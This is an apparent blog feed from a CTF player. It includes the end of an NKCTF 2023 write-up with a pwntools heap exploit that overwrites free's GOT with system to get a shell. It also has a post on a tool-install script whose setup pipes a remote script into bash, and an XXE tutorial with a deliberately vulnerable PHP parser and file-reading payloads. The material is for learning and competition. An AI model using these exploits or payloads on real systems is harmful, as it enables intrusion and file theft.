class="hljs-string">&#x27;./libc.so&#x27;</span>)<br><br>p=remote(<span class="hljs-string">&quot;node2.yuzhian.com.cn:30946&quot;</span>)<br><span class="hljs-comment">#p=process(&quot;./nk_note&quot;)</span><br><span class="hljs-comment">#gdb.attach(p)</span><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>show(<span class="hljs-number">16</span>)<br>d=u64(p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(d))<br>pause()<br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x500</span>,<span class="hljs-string">&quot;/bin/sh\x00&quot;</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x300</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x100</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x80</span>)<br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0x40</span>)<br>add(<span class="hljs-number">5</span>,<span class="hljs-number">0x20</span>)<br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span><br>edit(<span class="hljs-number">16</span>,payload)<br>show(<span class="hljs-number">16</span>)<br>p.readuntil(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>)<br>d1=u64(p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(d1))<br>e.address=d1-<span class="hljs-number">0x4120</span><br><br>func=<span class="hljs-string">&#x27;puts&#x27;</span><br>func_got=e.got[func]<br><br><br>l=[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x6B</span>):<br>    payload=<span class="hljs-string">&#x27;a&#x27;</span>*i*<span class="hljs-number">8</span><br>    edit(<span class="hljs-number">16</span>,payload)<br>    show(<span class="hljs-number">16</span>)<br>    data=p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).strip(<span class="hljs-string">b&#x27;a&#x27;</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    dn=u64(data)<br>    l.append(dn)<br><br><span class="hljs-built_in">print</span>(l)<br>pause()<br>payload=flat(l)+p64(e.address+<span class="hljs-number">0x4150</span>)<br>edit(<span class="hljs-number">16</span>,payload)<br>ind=<span class="hljs-number">0x26</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(e.address))<br><br>add(<span class="hljs-number">5</span>,<span class="hljs-number">0x40</span>)<br><br>edit(<span class="hljs-number">5</span>,p64(func_got))<br>show(ind)<br>dd=u64(p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(dd))<br>libc.address=dd-libc.sym[func]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc.address))<br>system=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(e.got[<span class="hljs-string">&#x27;free&#x27;</span>]))<br>edit(<span class="hljs-number">5</span>,p64(e.got[<span class="hljs-string">&#x27;free&#x27;</span>]))<br>edit(ind,p64(system))<br>free(<span class="hljs-number">0</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h1><h2 id="ez-baby-apk"><a href="#ez-baby-apk" class="headerlink" title="ez_baby_apk"></a>ez_baby_apk</h2><p>使用jadx加雷电模拟器进行调试</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/ez_baby_apk-1.png"></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/ez_baby_apk-2.png"></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/ez_baby_apk-3.png"></p><h2 id="PMKF"><a href="#PMKF" class="headerlink" title="PMKF"></a>PMKF</h2><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/PMKF-1.jpg"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python">a=[<span class="hljs-string">&quot;1122&quot;</span>,<span class="hljs-string">&quot;3322&quot;</span>,<span class="hljs-string">&quot;1223&quot;</span>,<span class="hljs-string">&quot;2211&quot;</span>,<span class="hljs-string">&quot;0111&quot;</span>,<span class="hljs-string">&quot;1101&quot;</span>,<span class="hljs-string">&quot;0000&quot;</span>,<span class="hljs-string">&quot;0101&quot;</span>,<span class="hljs-string">&quot;1211&quot;</span>,<span class="hljs-string">&quot;0111&quot;</span>,<span class="hljs-string">&quot;2223&quot;</span>,<span class="hljs-string">&quot;2330&quot;</span>,<span class="hljs-string">&quot;3323&quot;</span>,<span class="hljs-string">&quot;2211&quot;</span>,<span class="hljs-string">&quot;1112&quot;</span>,<span class="hljs-string">&quot;2333&quot;</span>]<br>e=[]<br>k=<span class="hljs-string">b&#x27;nkman&#x27;</span><br>k1=<span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> k:<br>    k1+=i<br>k1=k1&amp;<span class="hljs-number">0xff</span><br><span class="hljs-built_in">print</span>(k1)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:<br>    c=<span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> i:<br>        c+=<span class="hljs-built_in">bin</span>(<span class="hljs-built_in">int</span>(j))[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">2</span>)<br>    e.append(<span class="hljs-built_in">int</span>(c,<span class="hljs-number">2</span>)^k1)<br><span class="hljs-built_in">print</span>((<span class="hljs-string">b&#x27;\x05&#x27;</span>+<span class="hljs-string">b&#x27;nkman&#x27;</span>+<span class="hljs-built_in">bytes</span>(e)).<span class="hljs-built_in">hex</span>())<br></code></pre></td></tr></table></figure><h2 id="babyrust"><a href="#babyrust" class="headerlink" title="babyrust"></a>babyrust</h2><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/babyrust-1.jpg"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">a=<span class="hljs-string">b&quot;)&amp;n_qFb&#x27;NZXpj)*bLDmLnVj]@^_H&quot;</span><br>e=[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:<br>    d=(i-<span class="hljs-number">0x28</span>+<span class="hljs-number">45</span>)^<span class="hljs-number">0x30</span><br>    <span class="hljs-keyword">if</span> d&lt;<span class="hljs-number">0x20</span>:<br>        d=d+<span class="hljs-number">48</span><br>    e.append(d)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>(e))<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;rank：15&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/NKCTF2023.png&quot;&gt;&lt;/p&gt;
&lt;h1 id=&quot;Misc&quot;&gt;&lt;a href=&quot;#Misc&quot; class</summary>
      
    
    
    
    <category term="wp" scheme="https://www.dr0n.top/categories/wp/"/>
    
    
    <category term="wp" scheme="https://www.dr0n.top/tags/wp/"/>
    
    <category term="2023" scheme="https://www.dr0n.top/tags/2023/"/>
    
    <category term="nkctf" scheme="https://www.dr0n.top/tags/nkctf/"/>
    
  </entry>
  
  <entry>
    <title>auto_deploy.sh</title>
    <link href="https://www.dr0n.top/posts/b9ea1bfd/"/>
    <id>https://www.dr0n.top/posts/b9ea1bfd/</id>
    <published>2023-02-24T16:30:00.000Z</published>
    <updated>2024-02-29T08:47:27.939Z</updated>
    
    <content type="html"><![CDATA[<h1 id="auto-deploy"><a href="#auto-deploy" class="headerlink" title="auto_deploy"></a>auto_deploy</h1><p>一个自动部署Misc工具的<del>轻量</del>sh脚本<br>闲的无聊随便写的小玩意<br>适合在新环境中快速搭建misc环境</p><p><a href="https://github.com/dr0n1/auto_deploy">项目地址</a></p><h1 id="目前支持的功能"><a href="#目前支持的功能" class="headerlink" title="目前支持的功能"></a>目前支持的功能</h1><p>1：换网络源，允许 root ssh登录<br>2：安装docker<br>3：安装docker-compose<br>4：安装golang<br>5：安装java<br>6：安装linux下的部分misc工具，具体如下</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs text">binwalk<br>bkcrack<br>blindwatermark<br>cloacked-pixel<br>dtmf2num<br>dwarf2json<br>exif<br>extundelete<br>f5-steganography<br>foremost<br>gaps<br>gnuplot<br>minimodem<br>montage<br>outguess<br>pycdc<br>sstv<br>steghide<br>stegosaurus<br>stegpy<br>stegseek<br>usb-mouse-pcap-visualizer<br>usbkeyboarddatahacker<br>volatility2<br>volatility3<br>webp<br>wireshark<br>zsteg<br></code></pre></td></tr></table></figure><h1 id="支持的系统"><a href="#支持的系统" class="headerlink" title="支持的系统"></a>支持的系统</h1><p>1：ubuntu16.04&#x2F;18.04&#x2F;20.04&#x2F;22.04</p><p>推荐 ubuntu20 加代理运行</p><h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><p>本脚本可重复运行安装<br>工具保存在运行脚本的<code>misc_tools</code>目录下</p><p>方法一：<br>git clone <a href="https://github.com/lewiserii/auto_deploy">https://github.com/lewiserii/auto_deploy</a><br>chmod 777 auto_deploy.sh<br>.&#x2F;auto_deploy.sh [mode]</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">usage: ./auto_deploy.sh [mode]<br>        basics              基础配置(换源，vim，ssh)<br>        docker              安装docker<br>        docker-compoer      安装docker-compose<br>        go                  安装golang<br>        java                安装java<br>        misc-tools          安装misc工具<br></code></pre></td></tr></table></figure><p>方法二：<br>bash &lt;(curl -s <a href="https://raw.githubusercontent.com/dr0n1/auto_deploy/main/auto_deploy.sh">https://raw.githubusercontent.com/dr0n1/auto_deploy/main/auto_deploy.sh</a>) [mode]</p><p><img src="https://github.com/dr0n1/auto_deploy/blob/main/auto_deploy.gif?raw=true"></p><h1 id="更新日志"><a href="#更新日志" class="headerlink" title="更新日志"></a>更新日志</h1><p>V1.0: 第一代脚本<br>V1.1: 增加 python 安装模块<br>V1.2: 优化安装逻辑等<br>V1.3：移除 python，新增 golang 和 java<br>V2.1：增加 CTF-Misc 部分工具的安装<br>V2.2：优化可重复运行脚本逻辑<br>V2.3：优化部分 python 模块安装逻辑<br>V2.4：增加部分misc工具，格式化代码<br>V3.1：移除了centos的工具支持，增加golang多版本支持等</p><h1 id="后续计划"><a href="#后续计划" class="headerlink" title="后续计划"></a>后续计划</h1><p>1：计划增加 web 系列工具</p><p>有疑问或者有更好的建议请联系<a href="mailto:&#x31;&#57;&#51;&#x30;&#55;&#x37;&#52;&#51;&#x37;&#52;&#x40;&#113;&#x71;&#46;&#99;&#111;&#x6d;">&#x31;&#57;&#51;&#x30;&#55;&#x37;&#52;&#51;&#x37;&#52;&#x40;&#113;&#x71;&#46;&#99;&#111;&#x6d;</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;auto-deploy&quot;&gt;&lt;a href=&quot;#auto-deploy&quot; class=&quot;headerlink&quot; title=&quot;auto_deploy&quot;&gt;&lt;/a&gt;auto_deploy&lt;/h1&gt;&lt;p&gt;一个自动部署Misc工具的&lt;del&gt;轻量&lt;/del&gt;sh脚本&lt;br&gt;</summary>
      
    
    
    
    <category term="项目" scheme="https://www.dr0n.top/categories/%E9%A1%B9%E7%9B%AE/"/>
    
    
    <category term="misc" scheme="https://www.dr0n.top/tags/misc/"/>
    
    <category term="脚本" scheme="https://www.dr0n.top/tags/%E8%84%9A%E6%9C%AC/"/>
    
    <category term="自动化" scheme="https://www.dr0n.top/tags/%E8%87%AA%E5%8A%A8%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>xxe学习总结</title>
    <link href="https://www.dr0n.top/posts/aaf14e8/"/>
    <id>https://www.dr0n.top/posts/aaf14e8/</id>
    <published>2023-02-15T04:00:00.000Z</published>
    <updated>2024-02-29T08:47:27.948Z</updated>
    
    <content type="html"><![CDATA[<h1 id="从XML到XXE"><a href="#从XML到XXE" class="headerlink" title="从XML到XXE"></a>从XML到XXE</h1><h2 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h2><p><strong>什么是 XML？</strong><br>XML 指可扩展标记语言（EXtensible Markup Language）。<br>XML 的设计宗旨是传输数据，而不是显示数据。<br>XML 是 W3C 的推荐标准。<br>XML 不会做任何事情。XML 被设计用来结构化、存储以及传输信息。<br>XML 语言没有预定义的标签。</p><p><strong>XML 和 HTML 之间的差异</strong><br>XML 不是 HTML 的替代。<br>XML 和 HTML 为不同的目的而设计：</p><blockquote><p>XML 被设计用来传输和存储数据，其焦点是数据的内容。<br>HTML 被设计用来显示数据，其焦点是数据的外观。<br>HTML 旨在显示信息，而 XML 旨在传输信息。</p></blockquote><p>XML文档结构包括<code>XML声明</code>、<code>DTD文档类型定义（可选）</code>、<code>文档元素</code>。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--XML申明--&gt;</span><br><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><br><br><span class="hljs-comment">&lt;!--文档类型定义--&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">note</span> [  &lt;!--定义此文档是 note 类型的文档--&gt;</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">note</span> (<span class="hljs-keyword">to</span>,<span class="hljs-keyword">from</span>,<span class="hljs-keyword">heading</span>,<span class="hljs-keyword">body</span>)&gt;</span>  &lt;!--定义note元素有四个元素--&gt;</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">to</span> (<span class="hljs-keyword">#PCDATA</span>)&gt;</span>     &lt;!--定义to元素为”#PCDATA”类型--&gt;</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">from</span> (<span class="hljs-keyword">#PCDATA</span>)&gt;</span>   &lt;!--定义from元素为”#PCDATA”类型--&gt;</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">head</span> (<span class="hljs-keyword">#PCDATA</span>)&gt;</span>   &lt;!--定义head元素为”#PCDATA”类型--&gt;</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">body</span> (<span class="hljs-keyword">#PCDATA</span>)&gt;</span>   &lt;!--定义body元素为”#PCDATA”类型--&gt;</span><br><span class="hljs-meta">]&gt;</span><br><br><span class="hljs-comment">&lt;!--文档元素--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">note</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">to</span>&gt;</span>Dave<span class="hljs-tag">&lt;/<span class="hljs-name">to</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">from</span>&gt;</span>Tom<span class="hljs-tag">&lt;/<span class="hljs-name">from</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>Reminder<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>You are a good man<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">note</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h2><p>DTD(文档类型定义，Document Type Definition )的作用是定义<code>XML</code>文档的合法构建模块。它使用一系列的合法元素来定义文档结构。</p><h3 id="DTD引用方式"><a href="#DTD引用方式" class="headerlink" title="DTD引用方式"></a>DTD引用方式</h3><p>1）DTD 内部声明<br><code>&lt;!DOCTYPE 根元素 [元素声明]&gt;</code></p><p>2）DTD 外部引用<br><code>&lt;!DOCTYPE 根元素名称 SYSTEM &quot;外部DTD的URI&quot;&gt;</code></p><p>3）引用公共DTD<br><code>&lt;!DOCTYPE 根元素名称 PUBLIC &quot;DTD标识名&quot; &quot;公用DTD的URI&quot;&gt;</code></p><h3 id="DTD-关键字"><a href="#DTD-关键字" class="headerlink" title="DTD 关键字"></a>DTD 关键字</h3><ul><li>DOCTYPE（DTD的声明）</li><li>ENTITY（实体的声明）</li><li>SYSTEM、PUBLIC（外部资源申请）</li><li>ELEMENT（定义元素声明）</li></ul><h2 id="实体"><a href="#实体" class="headerlink" title="实体"></a>实体</h2><p>实体可以理解为变量，其必须在DTD中定义申明，可以在文档中的其他位置引用该变量的值。<br>实体按类型主要分为以下四种：</p><ul><li>内置实体 (Built-in entities)</li><li>字符实体 (Character entities)</li><li>通用实体&#x2F;普通实体 (General entities)</li><li>参数实体 (Parameter entities)</li></ul><p><strong>内置实体</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs text">&amp;符号: &amp;amp;<br>单引号: &amp;apos;<br>＞: &amp;gt;<br>＜: &amp;lt;<br>双引号: &amp;quot;<br></code></pre></td></tr></table></figure><p><strong>字符实体</strong></p><p>通常是<code>html</code>的实体编码，例如：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version = <span class="hljs-string">&quot;1.0&quot;</span> encoding = <span class="hljs-string">&quot;UTF-8&quot;</span> standalone = <span class="hljs-string">&quot;yes&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">author</span>[</span><br><span class="hljs-meta">   <span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">author</span> (<span class="hljs-keyword">#PCDATA</span>)&gt;</span></span><br><span class="hljs-meta">   <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">copyright</span> <span class="hljs-string">&quot;&amp;#169;&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">author</span>&gt;</span><span class="hljs-symbol">&amp;writer;</span><span class="hljs-symbol">&amp;copyright;</span><span class="hljs-tag">&lt;/<span class="hljs-name">author</span>&gt;</span><br></code></pre></td></tr></table></figure><p><code>&amp;#169</code>即<code>©</code></p><p><strong>普通实体</strong></p><p>例如：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version = <span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><br><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">note</span> [</span><br><span class="hljs-meta">   <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">source-text</span> <span class="hljs-string">&quot;tutorialspoint&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">note</span>&gt;</span><br>   &amp;source-text;<br><span class="hljs-tag">&lt;/<span class="hljs-name">note</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>参数实体</strong></p><p>例如</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">ename</span> <span class="hljs-string">&quot;entity_value&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p>参数实体必须先定义再使用，而不能像一般实体那样随意放置。</p><h3 id="内部实体与外部实体"><a href="#内部实体与外部实体" class="headerlink" title="内部实体与外部实体"></a>内部实体与外部实体</h3><p>实体根据引用方式，还可分为内部实体与外部实体。</p><p>内部实体：<br><code>&lt;!ENTITY entity_name &quot;entity_value&quot;&gt;</code></p><p>外部实体：<br><code>&lt;!ENTITY name SYSTEM &quot;URI/URL&quot;&gt;</code></p><h3 id="通用实体和参数实体"><a href="#通用实体和参数实体" class="headerlink" title="通用实体和参数实体"></a>通用实体和参数实体</h3><p>其实按照使用来分类，又可以将实体分为通用实体和参数实体。</p><p>通用实体：<br>用<code>&amp;实体名;</code>引用的实体，他在<code>DTD</code>中定义，在<code>XML</code>文档中引用</p><p>参数实体：<br>使用<code>% 实体名</code>在<code>DTD</code>中定义，并且只能在<code>DTD</code>中使用<code>%实体名;</code>引用<br>只有在<code>DTD</code>文件中，参数实体的声明才能引用其他实体<br>和通用实体一样，参数实体也可以外部引用</p><h3 id="不同程序支持的协议"><a href="#不同程序支持的协议" class="headerlink" title="不同程序支持的协议"></a>不同程序支持的协议</h3><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/xxe/xxe-4.png"></p><blockquote><p>1.其中从2012年9月开始，Oracle JDK版本中删除了对gopher方案的支持，后来又支持的版本是 Oracle JDK 1.7 update 7 和 Oracle JDK 1.6 update 35<br>2.libxml 是 PHP 的 xml 支持</p></blockquote><p>PHP支持的协议会更多一些，但需要一定的扩展：</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/xxe/xxe-9.png"></p><h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><p>XXE漏洞全称<code>XML External Entity Injection</code>即XML外部实体注入。<br>XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件和代码，造成任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起Dos攻击等危害。</p><h1 id="XXE的几种利用方式"><a href="#XXE的几种利用方式" class="headerlink" title="XXE的几种利用方式"></a>XXE的几种利用方式</h1><h2 id="有回显任意文件读取-Normal-Based-XXE"><a href="#有回显任意文件读取-Normal-Based-XXE" class="headerlink" title="有回显任意文件读取(Normal Based XXE)"></a>有回显任意文件读取(Normal Based XXE)</h2><p>服务能接收并解析 XML 格式的输入并且有回显的时候，我们就能输入我们自定义的 XML 代码，通过引用外部实体的方法，引用服务器上面的文件</p><p>xxe.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">libxml_disable_entity_loader</span>(<span class="hljs-literal">false</span>);<br><span class="hljs-variable">$xmlfile</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>); <span class="hljs-comment">//获取客户端输入内容</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$xmlfile</span>))&#123;<br>    <span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DOMDocument</span>();    <span class="hljs-comment">//初始化XML解析器</span><br>    <span class="hljs-variable">$dom</span>-&gt;<span class="hljs-title function_ invoke__">loadXML</span>(<span class="hljs-variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD); <span class="hljs-comment">//加载客户端输入的XML内容</span><br>    <span class="hljs-variable">$creds</span> = <span class="hljs-title function_ invoke__">simplexml_import_dom</span>(<span class="hljs-variable">$dom</span>);  <span class="hljs-comment">//获取XML文档节点，如果成功则返回SimpleXMLElement对象，如果失败则返回FALSE</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$creds</span>;<br>&#125;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">test</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///flag&quot;</span>&gt;</span> ]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/xxe/xxe-1.png"></p><h3 id="特殊符号"><a href="#特殊符号" class="headerlink" title="特殊符号"></a>特殊符号</h3><p>如果读取的文件中包含特殊符号，比如<code>&lt;</code>、<code>&gt;</code>、<code>&amp;</code>、<code>&quot;</code>、<code>&#39;</code>等，就会返回一些报错信息</p><p>这时可以使用<code>CDATA</code>或者<code>base64 convert</code></p><p>术语<code>CDATA</code>指的是不应由<code>XML解析器</code>进行解析的文本数据<code>（Unparsed Character Data）</code><br><code>CDATA</code>部分由<code>&quot;&lt;![CDATA[&quot;</code>开始，由<code>&quot;]]&gt;&quot;</code>结束，解析器会忽略<code>CDATA</code>部分中的所有内容</p><p>我们的思路就是把读取的文件放在CDATA中之后再调用</p><p>payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">test</span></span><br><span class="hljs-meta">[<span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">start</span></span></span><br><span class="hljs-meta"><span class="hljs-meta"><span class="hljs-string">&quot;&lt;![CDATA[&lt;!ENTITY % xxe SYSTEM &quot;</span>file:///flag<span class="hljs-string">&quot;&gt; ]]&gt;&quot;</span></span></span><br><span class="hljs-meta"><span class="hljs-meta">&gt;</span>]</span><br><span class="hljs-meta">% <span class="hljs-keyword">xxe</span>;&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">test</span>&gt;</span>&amp;start<span class="hljs-tag">&lt;/<span class="hljs-name">test</span>&gt;</span><br></code></pre></td></tr></table></figure><p>不过使用这个payload读文件时还是会报错，因为在<code>xml</code>中，<code>xml</code>解析器有个限制：不能在内部<code>Entity</code>中引用，<code>“PEReferences forbidden in internal subset in Entity 